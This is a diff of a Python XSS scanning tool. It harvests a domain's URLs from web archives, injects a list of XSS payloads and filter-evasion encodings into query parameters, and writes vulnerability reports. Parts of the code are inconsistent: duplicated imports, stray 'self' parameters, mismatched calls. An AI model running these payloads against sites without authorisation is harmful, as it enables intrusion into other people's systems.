@@ -1,18 +1,31 @@
 import base64
 import threading
+import pandas as pd
+import os
+from datetime import datetime
+from colorama import Fore, Style
 import sys
+import argparse
 import requests
 import argparse
+import re
+import argparse
+import re
+from urllib.parse import urlparse, parse_qs, urlunparse
 import numpy as np
 import sqlite3
+import random
 import signal
 from datetime import datetime
 import time
 import base64
+import threading
 from functools import partial
 from concurrent.futures import ThreadPoolExecutor
 from jinja2 import Environment, FileSystemLoader
 from urllib.parse import urlparse, parse_qs
+import html
+from colorama import Fore, Style
 
 cursor = "|"
 
@@ -33,6 +46,72 @@ current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 requests.packages.urllib3.disable_warnings()
 
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
+
+# Capture start time
+start_time = time.time()
+
+# Define folder paths for outputs
+OUTPUT_FOLDER = "reports"
+HTML_FOLDER = os.path.join(OUTPUT_FOLDER)
+TEXT_FOLDER = os.path.join(OUTPUT_FOLDER)
+
+# Ensure the folders exist
+os.makedirs(HTML_FOLDER, exist_ok=True)
+os.makedirs(TEXT_FOLDER, exist_ok=True)
+
+from colorama import Fore, Style
+
+def score_endpoint(url, response, payloads):
+    score = 0
+
+    if response.status_code == 200:
+        score += 3
+        print(f"{Fore.GREEN}[200 OK]{Style.RESET_ALL} Status code indicates success. Score: +3")
+    elif response.status_code in [403, 302]:
+        score += 2
+        print(f"{Fore.YELLOW}[Redirect or Forbidden]{Style.RESET_ALL} Status code {response.status_code} detected. Score: +2")
+
+    if any(payload in response.text for payload in payloads):
+        score += 5
+        print(f"{Fore.MAGENTA}[Payload Match]{Style.RESET_ALL} XSS payload detected in response. Score: +5")
+
+    if '?' in url and '=' in url:
+        score += 2
+        print(f"{Fore.CYAN}[Query Parameters Found]{Style.RESET_ALL} URL contains query parameters. Score: +2")
+
+    if 'error' in response.text or 'not found' in response.text:
+        score -= 3
+        print(f"{Fore.RED}[Error/Not Found]{Style.RESET_ALL} 'Error' or 'Not Found' detected in response. Score: -3")
+
+    return score
+
+
+def display_output(urls):
+    """
+    Nicely formatted CLI output for URLs.
+
+    Args:
+        urls (list): List of processed URLs.
+    """
+    print("\nProcessed URLs:\n" + "=" * 40)
+    if urls:
+        for i, url in enumerate(urls, 1):
+            print(f"[{i}] {url}")
+    else:
+        print("No usable URLs found.")
+    print("=" * 40)
+
+def print_colored_result(url, score, elapsed_time=None):
+    if score >= 5:
+        print(f"{Fore.GREEN}[Likely Valid]{Style.RESET_ALL} {url} "
+              f"(Score: {score}, Time: {elapsed_time:.2f}s)" if elapsed_time else f"{Fore.GREEN}[Likely Valid]{Style.RESET_ALL} {url}")
+    elif score >= 2:
+        print(f"{Fore.YELLOW}[Medium Likelihood]{Style.RESET_ALL} {url} "
+              f"(Score: {score}, Time: {elapsed_time:.2f}s)" if elapsed_time else f"{Fore.YELLOW}[Medium Likelihood]{Style.RESET_ALL} {url}")
+    else:
+        print(f"{Fore.RED}[Unlikely Valid]{Style.RESET_ALL} {url} "
+              f"(Score: {score}, Time: {elapsed_time:.2f}s)" if elapsed_time else f"{Fore.RED}[Unlikely Valid]{Style.RESET_ALL} {url}")
+  
 
 xss_payloads = [
     '<script>alert("XSS")</script>',
@@ -88,7 +167,6 @@ xss_payloads = [
     '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
     '<img src=x onerror=confirm("XSS")>',
     '<img src=x onerror=eval("alert(\'XSS\')")>',
-    # ... (previous payloads)
     '<img src=x onerror=alert("XSS")>',
     '<a href="javascript:alert(\'XSS\')">Click Me</a>',
     # XSS Locator (Polygot)
@@ -242,7 +320,7 @@ obfuscation_methods = [
         lambda payload: "".join(f"\\{char}" for char in payload) if payload else payload,
 
         # 29. Obfuscate with double backslashes (e.g., \\char)
-        lambda payload: "".join(f"\\\{char}" for char in payload) if payload else payload,
+        lambda payload: "".join(f"\\{char}" for char in payload) if payload else payload,
 
         # 30. Obfuscate with percent-encoded characters (e.g., %uHHHH)
         lambda payload: "".join(f"%u{ord(char):04X}" for char in payload) if payload else payload,
@@ -440,17 +518,48 @@ obfuscation_methods = [
         lambda payload: "".join(f"\\u<" + f"{ord(char):04x}" + "> " + f"\\u<" + f"{ord(char):04x}" + "> " for char in payload) if payload else payload,
     ]
 
-def get_arguments():
-    parser = argparse.ArgumentParser(description='Advanced XSS Reporter')
-    parser.add_argument("-t", "--thread", dest="thread", help="Number of Threads to Use. Default=50", default=50)
-    parser.add_argument("-o", "--output", dest="output", help="Save Vulnerable URLs in TXT file")
-    parser.add_argument("-s", "--subs", dest="want_subdomain", help="Include Results of Subdomains", action='store_true')
-    parser.add_argument("--deepcrawl", dest="deepcrawl", help="Uses All Available APIs of CommonCrawl for Crawling URLs [**Takes Time**]", action='store_true')
-    parser.add_argument("--report", dest="report_file", help="Generate an HTML report", default=None)
-    required_arguments = parser.add_argument_group('Required Arguments')
-    required_arguments.add_argument("-l", "--list", dest="url_list", help="URLs List, e.g., google_urls.txt")
-    required_arguments.add_argument("-d", "--domain", dest="domain", help="Target Domain Name, e.g., testphp.vulnweb.com")
-    return parser.parse_args()
+def make_get_request(url, response_type="json"):
+    """
+    Utility function to make GET requests and handle responses.
+    """
+    retries = 3
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+    }
+
+    for attempt in range(retries):
+        try:
+            response = requests.get(url, headers=headers, timeout=2, verify=False)
+            if response.ok:
+                return response.json() if response_type.lower() == "json" else response.text
+        except requests.RequestException as e:
+            print(f"Attempt {attempt + 1} failed for {url}: {e}")
+        time.sleep(2)
+    print(f"Failed to fetch {url} after {retries} attempts.")
+    return None
+
+
+def save_extracted_urls_to_file(url_list, output_file):
+    """
+    Save extracted URLs to the specified .txt file.
+    """
+    try:
+        with open(output_file, 'w') as file:
+            for url in url_list:
+                file.write(url + "\n")
+        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Extracted URLs saved to {output_file}")
+    except OSError as e:
+        print(f"Error saving extracted URLs: {e}")
+
+def limit_links(url_list, limit):
+    if limit == "all":
+        return url_list
+    try:
+        limit = int(limit)
+        return url_list[:limit]
+    except ValueError:
+        print(f"Invalid value for --test-links: {limit}. Using all links.")
+        return url_list
 
 def readTargetFromFile(filepath):
     urls_list = []
@@ -459,6 +568,49 @@ def readTargetFromFile(filepath):
             if urls.strip():
                 urls_list.append(urls.strip())
     return urls_list
+
+
+def store_vulnerabilities_in_sqlite(self):
+    try:
+        conn = sqlite3.connect('vulnerabilities.db')
+        cursor = conn.cursor()
+        # Create table if not exists
+        cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities (
+                            id INTEGER PRIMARY KEY AUTOINCREMENT,
+                            url TEXT NOT NULL,
+                            payload TEXT NOT NULL,
+                            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+                        )''')
+        # Insert vulnerabilities
+        for url, payload in self.vulnerable_urls:
+            cursor.execute('INSERT INTO vulnerabilities (url, payload) VALUES (?, ?)', (url, payload))
+        conn.commit()
+        conn.close()
+        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}  Vulnerabilities stored in SQLite database. {Style.RESET_ALL} ")
+    except Exception as e:
+        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED} Error storing vulnerabilities in database: {Style.RESET_ALL} {e}" )
+
+
+def generate_report(self):
+    try:
+        env = Environment(loader=FileSystemLoader('.'))
+        env.globals['enumerate'] = enumerate  # Ensure Jinja2 templates have access to enumerate
+        template = env.get_template('report_template.html')
+        
+        report_data = {
+            'timestamp': current_time,
+            'vulnerable_urls': self.vulnerable_urls,
+            'total_links_audited': len(self.url_list),
+            'total_vulnerabilities': len(self.vulnerable_urls)
+        }
+
+        report_html = template.render(report_data)
+        with open(self.report_file, 'w') as report_file:
+            report_file.write(report_html)
+        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}HTML report generated: {self.report_file} {Style.RESET_ALL}")
+    except Exception as e:
+        print(f"Error generating report: {e}")
+
 
 def start(self):
     # Count and display the number of discovered links
@@ -482,115 +634,697 @@ class PassiveCrawl:
         self.threadNumber = threadNumber
         self.final_url_list = set()
 
+    def make_get_request(url, response_type="json"):
+        """
+        Utility function to make GET requests and handle responses.
+        """
+        retries = 3
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+        }
+
+        for attempt in range(retries):
+            try:
+                response = requests.get(url, headers=headers, timeout=2, verify=False)
+                if response.ok:
+                    return response.json() if response_type.lower() == "json" else response.text
+            except requests.RequestException as e:
+                print(f"Attempt {attempt + 1} failed for {url}: {e}")
+            time.sleep(2)
+        print(f"Failed to fetch {url} after {retries} attempts.")
+        return None
+
+    def extract_from_sources(domain, want_subdomain, sources):
+        """
+        Extract URLs from specified sources: AlienVault, Wayback Machine, and CommonCrawl.
+        """
+        final_url_list = set()
+        wild_card = "*." if want_subdomain else ""
+
+        # Iterate through the selected sources
+        for source in sources:
+            try:
+                if source.lower() == "alienvault":
+                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from AlienVault...")
+                    url = f"https://otx.alienvault.com/api/v1/indicators/hostname/{domain}/url_list"
+                    raw_urls = make_get_request(url, "json")
+                    if raw_urls and "url_list" in raw_urls:
+                        for url_data in raw_urls["url_list"]:
+                            final_url_list.add(url_data["url"])
+                elif source.lower() == "wayback":
+                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from Wayback Machine...")
+                    url = f"http://web.archive.org/cdx/search/cdx?url={wild_card+domain}/*&output=json&collapse=urlkey&fl=original"
+                    urls_list = make_get_request(url, "json")
+                    if urls_list:
+                        for url in urls_list[1:]:  # Skip the header
+                            final_url_list.add(url[0])
+                elif source.lower() == "commoncrawl":
+                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from CommonCrawl...")
+                    api_list = [
+                        "http://index.commoncrawl.org/CC-MAIN-2024-10-index",
+                        "http://index.commoncrawl.org/CC-MAIN-2023-06-index"
+                    ]
+                    for api in api_list:
+                        url = f"{api}?url={wild_card+domain}/*&fl=url"
+                        raw_urls = make_get_request(url, "text")
+                        if raw_urls and ("No Captures found" not in raw_urls):
+                            urls_list = raw_urls.split("\n")
+                            final_url_list.update(url.strip() for url in urls_list if url.strip())
+                else:
+                    print(f"[!] Unknown source: {source}")
+            except Exception as e:
+                print(f"[!] Error fetching from {source}: {e}")
+
+        return list(final_url_list)
+
+
+
     def start(self):
-        if self.deepcrawl:
-            self.startDeepCommonCrawl()
-        else:
-            self.getCommonCrawlURLs(self.domain, self.want_subdomain, ["http://index.commoncrawl.org/CC-MAIN-2018-22-index"])
-        urls_list1 = self.getWaybackURLs(self.domain, self.want_subdomain)
-        urls_list2 = self.getOTX_URLs(self.domain)
-        self.final_url_list.update(urls_list1)
-        self.final_url_list.update(urls_list2)
-        return list(self.final_url_list)
+        try:
+            if self.deepcrawl:
+                self.startDeepCommonCrawl()
+            else:
+                self.getCommonCrawlURLs(
+                    self.domain,
+                    self.want_subdomain,
+                    ["http://index.commoncrawl.org/CC-MAIN-2018-22-index"]
+                )
+        except Exception as e:
+            print(f"[!] CommonCrawl failed: {e}. Switching to WaybackMachine and AlienVault.")
 
-    def getIdealDomain(self, domainName):
-        final_domain = domainName.replace("http://", "")
-        final_domain = final_domain.replace("https://", "")
-        final_domain = final_domain.replace("/", "")
-        final_domain = final_domain.replace("www", "")
-        return final_domain
+        try:
+            wayback_urls = self.getWaybackURLs(self.domain, self.want_subdomain)
+            self.final_url_list.update(wayback_urls)
+        except Exception as e:
+            print(f"[!] WaybackMachine failed: {e}. Moving to AlienVault.")
 
-    def split_list(self, list_name, total_part_num):
-        final_list = []
-        split = np.array_split(list_name, total_part_num)
-        for array in split:
-            final_list.append(list(array))
-        return final_list
+        try:
+            alienvault_urls = self.getOTX_URLs(self.domain)
+            self.final_url_list.update(alienvault_urls)
+        except Exception as e:
+            print(f"[!] AlienVault failed: {e}. Unable to fetch URLs.")
 
-    def make_GET_Request(self, url, response_type):
-        response = requests.get(url)
-        if response_type.lower() == "json":
-            result = response.json()
-        else:
-            result = response.text
-        return result
+        self.url_list = list(self.final_url_list)
+        return self.url_list
+
+    def getCommonCrawlURLs(self, domain, want_subdomain, apiList):
+        try:
+            if want_subdomain:
+                wild_card = "*."
+            else:
+                wild_card = ""
+            final_urls_list = set()
+            for api in apiList:
+                url = f"{api}?url={wild_card+domain}/*&fl=url"
+                raw_urls = self.make_GET_Request(url, "text")
+                if raw_urls and ("No Captures found" not in raw_urls):
+                    urls_list = raw_urls.split("\n")
+                    final_urls_list.update(url.strip() for url in urls_list if url.strip())
+            self.final_url_list.update(final_urls_list)
+        except Exception as e:
+            print(f"[!] Error fetching CommonCrawl URLs: {e}.")
+            raise  # Ensure fallback triggers
 
     def getWaybackURLs(self, domain, want_subdomain):
-        if want_subdomain:
-            wild_card = "*."
-        else:
-            wild_card = ""
+        wild_card = "*." if want_subdomain else ""
         url = f"http://web.archive.org/cdx/search/cdx?url={wild_card+domain}/*&output=json&collapse=urlkey&fl=original"
         urls_list = self.make_GET_Request(url, "json")
-        try:
-            urls_list.pop(0)
-        except:
-            pass
         final_urls_list = set()
-        for url in urls_list:
-            final_urls_list.add(url[0])
+        if urls_list:
+            for url in urls_list[1:]:  # Skip the header
+                final_urls_list.add(url[0])
         return list(final_urls_list)
 
     def getOTX_URLs(self, domain):
         url = f"https://otx.alienvault.com/api/v1/indicators/hostname/{domain}/url_list"
         raw_urls = self.make_GET_Request(url, "json")
-        urls_list = raw_urls["url_list"]
         final_urls_list = set()
-        for url in urls_list:
-            final_urls_list.add(url["url"])
+        if raw_urls and "url_list" in raw_urls:
+            for url_data in raw_urls["url_list"]:
+                final_urls_list.add(url_data["url"])
         return list(final_urls_list)
-
-    def startDeepCommonCrawl(self):
-        api_list = self.get_all_api_CommonCrawl()
-        collection_of_api_list = self.split_list(api_list, int(self.threadNumber))
-        thread_list = []
-        for thread_num in range(int(self.threadNumber)):
-            t = threading.Thread(target=self.getCommonCrawlURLs, args=(self.domain, self.want_subdomain, collection_of_api_list[thread_num],))
-            thread_list.append(t)
-        for thread in thread_list:
-            thread.start()
-        for thread in thread_list:
-            thread.join()
-
-    def get_all_api_CommonCrawl(self):
-        url = "http://index.commoncrawl.org/collinfo.json"
-        raw_api = self.make_GET_Request(url, "json")
-        final_api_list = []
-        for items in raw_api:
-            final_api_list.append(items["cdx-api"])
-        return final_api_list
-
-    def getCommonCrawlURLs(self, domain, want_subdomain, apiList):
-        if want_subdomain:
-            wild_card = "*."
-        else:
-            wild_card = ""
-        final_urls_list = set()
-        for api in apiList:
-            url = f"{api}?url={wild_card+domain}/*&fl=url"
-            raw_urls = self.make_GET_Request(url, "text")
-            if ("No Captures found for:" not in raw_urls) and ("<title>" not in raw_urls):
-                urls_list = raw_urls.split("\n")
-                for url in urls_list:
-                    if url != "":
-                        final_urls_list.add(url)
-        return list(final_urls_list)
-
+    
 class XSSScanner:
-    def __init__(self, url_list, threadNumber, report_file, payload=None):
+    def __init__(self, domain, url_list, threadNumber, report_file, skip_duplicate, use_filters, payload=None, duration=None):
         self.url_list = url_list
         self.threadNumber = threadNumber
+        self.domain = domain
         self.vulnerable_urls = []
         self.report_file = report_file
         self.payload = payload
+        self.skip_duplicate = skip_duplicate
+        self.use_filters = use_filters  # Number of filters to use
+        self.url_test_counts = {}  # Dictionary to track URL test counts
         self.stop_scan = False
         self.links_discovered = len(url_list)  # Initialize links_discovered
         self.links_audited = 0  # Initialize links_audited
+        self.duration = duration  # Duration to run the scan
         signal.signal(signal.SIGINT, self.handle_ctrl_c)
+        if duration:
+            timer_thread = threading.Thread(target=self.quit_after_duration)
+            timer_thread.daemon = True
+            timer_thread.start()
+
+
+    import html
+
+    def sanitize_payload(payload):
+        """
+        Sanitize payloads to neutralize potentially harmful scripts or code.
+        """
+        # Escape HTML special characters to prevent rendering
+        sanitized_payload = html.escape(payload)
+        # Replace potentially harmful functions with harmless text
+        sanitized_payload = sanitized_payload.replace("alert", "[alert disabled]")
+        sanitized_payload = sanitized_payload.replace("confirm", "[confirm disabled]")
+        sanitized_payload = sanitized_payload.replace("eval", "[eval disabled]")
+        return sanitized_payload
+
+    def save_to_html_file(self, vulnerable_urls):
+        """
+        Save all vulnerable URLs and their payloads to a formatted HTML file.
+        Includes options to download CSV and Excel files for Business Intelligence tools.
+        """
+        try:
+            # Ensure the domain is set
+            if not hasattr(self, 'domain') or not self.domain:
+                self.domain = "Unknown Domain"
+
+            # Create output folders if they do not exist
+            OUTPUT_FOLDER = "reports"
+            HTML_FOLDER = os.path.join(OUTPUT_FOLDER)
+            os.makedirs(HTML_FOLDER, exist_ok=True)
+
+            # Generate dynamic filenames based on current timestamp
+            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            csv_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.csv")
+            excel_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.xlsx")
+            json_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.json")
+            html_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.html")
+
+            # Save data to CSV, Excel, and JSON files
+            df = pd.DataFrame(vulnerable_urls, columns=["URL", "Payload"])
+            df.to_csv(csv_file, index=False)
+            df.to_excel(excel_file, index=False)
+            df.to_json(json_file, orient="records", lines=True)
+            js_code = '<script>function alert({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codeb = '<script>function confirm({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codec = '<script>function eval({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_coded = '<script>function img({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codee = '<script>function src({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codef = '<script>function iframe({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codeg = '<script>function javascript({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codeh = '<script>function form({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codei = '<script>function a({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codej = '<script>function object({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codek = '<script>function swf({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codel = '<script>function table({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codem = '<script>function div({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_coden = '<script>function td({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codeo = '<script>function object type({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codep = '<script>function svg({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            js_codeq = '<script>function style({{}})</script>'  # Use {{}} to escape the curly braces in f-string
+            # Generate the HTML report
+            with open(html_file, "w") as file:
+                file.write(
+                    f"""
+                    <!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>XSS Vulnerabilities Report</title>
+                        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+                    {js_code}
+                    {js_codeb}
+                    {js_codec}
+                    {js_coded}
+                    {js_codee}
+                    {js_codef}
+                    {js_codeg}
+                    {js_codeh}
+                    {js_codei}
+                    {js_codej}
+                    {js_codek}
+                    {js_codel}
+                    {js_codem}
+                    {js_coden}
+                    {js_codeo}
+                    {js_codep}
+                    {js_codeq}
+                    </head>
+                    <body>
+                        <div class="container py-5">
+                            <h1 class="text-center text-danger">XSS Vulnerabilities Report</h1>
+                            <p class="text-muted text-center"><strong>Report generated on:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
+                            <p class="text-muted text-center"><strong>Target Domain:</strong> <span class="text-primary">{self.domain}</span></p>
+                            
+                            <div class="mb-4">
+                                <h2>Summary</h2>
+                                <div class="row">
+                                    <div class="col-md-6">
+                                        <p><strong>Total Links Audited:</strong> <span class="text-primary">{len(self.url_list)}</span></p>
+                                    </div>
+                                    <div class="col-md-6">
+                                        <p><strong>Total Vulnerabilities Found:</strong> <span class="text-danger">{len(vulnerable_urls)}</span></p>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <h2 class="mt-4">Vulnerable URLs</h2>
+                            <table class="table table-bordered table-striped table-hover">
+                                <thead class="table-dark">
+                                    <tr>
+                                        <th>#</th>
+                                        <th>URL</th>
+                                        <th>Payload</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                    """
+                )
+
+                # Add table rows for each vulnerability
+                for idx, (payload_url, payload) in enumerate(vulnerable_urls, start=1):
+                    sanitized_url = html.escape(payload_url)  # Escape the URL
+                    sanitized_payload = sanitize_payload(payload)  # Sanitize the payload
+                    file.write(
+                        f"""
+                        <tr>
+                            <td>{idx}</td>
+                            <td>{sanitized_url}</td>
+                            <td>{sanitized_payload}</td>
+                        </tr>
+                        """
+                    )
+
+                # Add download links and close HTML tags
+                file.write(
+                    f"""
+                                </tbody>
+                            </table>
+
+                            <div class="mt-4">
+                                <h3>Download Options</h3>
+                                <a href="{os.path.basename(csv_file)}" class="btn btn-primary">Download CSV</a>
+                                <a href="{os.path.basename(excel_file)}" class="btn btn-success">Download Excel</a>
+                                <a href="{os.path.basename(json_file)}" class="btn btn-warning">Download JSON</a>
+                            </div>
+                        </div>
+                    </body>
+                    </html>
+                    """
+                )
+
+            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] HTML report saved to {html_file}")
+            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] CSV, Excel, and JSON files generated.")
+        except Exception as e:
+            print(f"Error saving to HTML file: {e}")
+
+
+
+    def save_to_text_file(self, vulnerable_urls):
+        """
+        Save a payload URL to a dynamically named text file in the text folder.
+        """
+        try:
+            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            vulnerable_urls_filename = os.path.join(TEXT_FOLDER, f"vulnerable_urls_{timestamp}.txt")
+            with open(vulnerable_urls_filename, 'a') as file:
+                file.write(vulnerable_urls + "\n")
+            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Vulnerable URL saved to {vulnerable_urls_filename}")
+        except OSError as e:
+            print(f"Error saving vulnerable URL to text file: {e}")
+
+    def store_vulnerabilities_in_sqlite(self):
+        try:
+            conn = sqlite3.connect('vulnerabilities.db')
+            cursor = conn.cursor()
+            # Create table if not exists
+            cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities (
+                                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                                url TEXT NOT NULL,
+                                payload TEXT NOT NULL,
+                                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+                            )''')
+            # Insert vulnerabilities
+            for url, payload in self.vulnerable_urls:
+                cursor.execute('INSERT INTO vulnerabilities (url, payload) VALUES (?, ?)', (url, payload))
+            conn.commit()
+            conn.close()
+            print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}  Vulnerabilities stored in SQLite database. {Style.RESET_ALL} ")
+        except Exception as e:
+            print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED} Error storing vulnerabilities in database: {Style.RESET_ALL} {e}" )
+
+
+
+    def generate_report(self):
+        try:
+            env = Environment(loader=FileSystemLoader('.'))
+            env.globals['enumerate'] = enumerate  # Ensure Jinja2 templates have access to enumerate
+            template = env.get_template('report_template.html')
+            
+            report_data = {
+                'timestamp': current_time,
+                'vulnerable_urls': self.vulnerable_urls,
+                'total_links_audited': len(self.url_list),
+                'total_vulnerabilities': len(self.vulnerable_urls)
+            }
+
+            report_html = template.render(report_data)
+            with open(self.report_file, 'w') as report_file:
+                report_file.write(report_html)
+            print(f"[{current_time}] HTML report generated: {self.report_file}")
+        except Exception as e:
+            print(f"Error generating report: {e}")
+
+
+    def scan_urls_for_xss(self, url, output_failed_payloads=True):
+        successful_payloads = []
+        failed_payloads = []
+
+        # Increment test count for the URL and check duplicate limit
+        self.url_test_counts[url] = self.url_test_counts.get(url, 0) + 1
+        if self.url_test_counts[url] > self.skip_duplicate:
+            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Skipping duplicate URL: {url}")
+            return successful_payloads
+
+        # Parse query parameters
+        parsed_url = urlparse(url)
+        query_params = parse_qs(parsed_url.query)
+
+        # Skip irrelevant parameters (e.g., files, images, etc.)
+        file_related_keywords = ["path", "image", "jquery", "download", "preloaded"]
+        filtered_params = [
+            param for param in query_params if not any(keyword in param.lower() for keyword in file_related_keywords)
+        ]
+
+        if not filtered_params:
+            print(
+    f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]{Style.RESET_ALL} "  # Timestamp
+    f"{Fore.RED}No valid parameters found{Style.RESET_ALL} in URL: {Fore.CYAN}{url}{Style.RESET_ALL}. "  # Highlighting the 'No valid parameters' and URL
+    f"{Fore.MAGENTA}Testing with advanced heuristics.{Style.RESET_ALL}"  # Highlighting the heuristics testing part
+)
+
+            
+            # Common parameter names and additional ones from heuristics
+            common_params = ['id', 'page', 'url', 'query', 'search', 'ref', 'cat', 'name', 'item', 'file']
+            dummy_payloads = [f"{url}?{param}={payload}" for param, payload in zip(common_params, xss_payloads[:10])]
+            
+            heuristic_results = []
+            for dummy_payload_url in dummy_payloads:
+                try:
+                    response = requests.get(dummy_payload_url, verify=False, timeout=2)
+                    status_code = response.status_code
+                    response_text = response.text.lower()
+
+                    # Heuristic scoring based on response analysis
+                    score = 0
+
+                    if status_code == 200:
+                        score += 5
+                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}[200 OK]{Style.RESET_ALL} Status code indicates success. Score: +5")
+
+                    if any(payload.lower() in response_text for payload in xss_payloads[:10]):
+                        score += 10
+                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.MAGENTA}[Payload Match]{Style.RESET_ALL} XSS payload found in response. Score: +10")
+
+                    if "error" in response_text or "invalid" in response_text:
+                        score += 3
+                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.YELLOW}[Error/Invalid Found]{Style.RESET_ALL} 'Error' or 'Invalid' detected in response. Score: +3")
+
+                    if "query" in response_text or "parameter" in response_text:
+                        score += 5
+                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.CYAN}[Query/Parameter Found]{Style.RESET_ALL} Query-related keywords detected. Score: +5")
+
+                    if len(response_text) > 1000:
+                        score += 2
+                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.BLUE}[Long Response]{Style.RESET_ALL} Response length exceeds 1000 characters. Score: +2")
+
+                    heuristic_results.append((dummy_payload_url, score))
+
+                except requests.RequestException as e:
+                    print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.RED}[Request Error]{Style.RESET_ALL}{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} for dummy payload {dummy_payload_url}: {e}")
+
+            # Sort by heuristic scores in descending order
+            heuristic_results.sort(key=lambda x: x[1], reverse=True)
+
+            # Test top-scoring candidates
+            for test_url, score in heuristic_results[:5]:  # Limit further tests to top 5
+                try:
+                    response = requests.get(test_url, verify=False, timeout=2)
+                    if response.status_code == 200 and any(payload in response.text for payload in xss_payloads[:10]):
+                        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}Potential XSS vulnerability found with heuristic endpoint: {test_url}")
+                        successful_payloads.append((test_url, "Heuristic Test"))
+                        self.save_to_text_file(test_url)
+                except requests.RequestException as e:
+                    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} Request error during heuristic refinement for {test_url}: {e}")
+
+            return successful_payloads
+
+
+        # Test each payload against the filtered parameters
+        selected_filters = xss_payloads[:self.use_filters]  # Apply the specified number of filters
+        for param in filtered_params:
+            for payload in selected_filters:
+                payload_url = f"{url}?{param}={payload}"
+                try:
+                    response = requests.get(payload_url, verify=False, timeout=2)
+
+                    if self.stop_scan:
+                        return successful_payloads
+
+                    if response.status_code == 200 and payload in response.text:
+                        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}Potential XSS vulnerability found: {payload_url}")
+                        successful_payloads.append((payload_url, payload))
+                        self.save_to_text_file(payload_url)
+                        self.save_to_html_file(payload_url, payload)
+                    else:
